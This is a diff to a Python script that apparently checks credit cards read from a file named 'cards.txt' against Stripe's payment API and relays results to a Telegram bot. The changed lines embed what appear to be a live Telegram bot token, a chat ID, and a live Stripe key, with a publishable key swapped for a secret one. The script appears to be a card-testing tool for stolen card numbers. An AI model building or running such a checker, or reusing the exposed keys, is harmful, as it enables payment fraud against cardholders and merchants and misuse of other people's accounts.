@@ -5,8 +5,8 @@ F = '\033[2;32m'
 B = '\033[2;36m'
 X = '\033[1;33m' 
 C = '\033[2;35m'
-token = input(C+'7939724920:AAHSKJb3MKWPffhXdPDF3Vk4OIGNtxtlmJc:'+X)
-ID = input(B+'7229710638:'+F)
+token = input(C+'7939724920:AAHSKJb3MKWPffhXdPDF3Vk4OIGNtxtlmJc'+X)
+ID = input(B+'7229710638'+F)
 file=open('cards.txt',"+r")
 Z = '\033[1;31m'  # أحمر
 F = '\033[2;32m'  # أخضر
@@ -124,7 +124,7 @@ for P in file.readlines():
 	    'payment_method': id,
 	    'expected_payment_method_type': 'card',
 	    'use_stripe_sdk': 'true',
-	    'key': 'pk_live_51HE3egFmM52WOkSoBn3BPTMWMkvQbxQ2XaGYHCSNYNfDM8rpeGDb7VvqpmoPyWwQFKXnO9KBpJq3nEi0gMOoRjW2001jRjIO38',
+	    'key': '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',
 	    'client_secret': clientSecret,
 	}
 	ids=clientSecret.split('_secret_')[0]
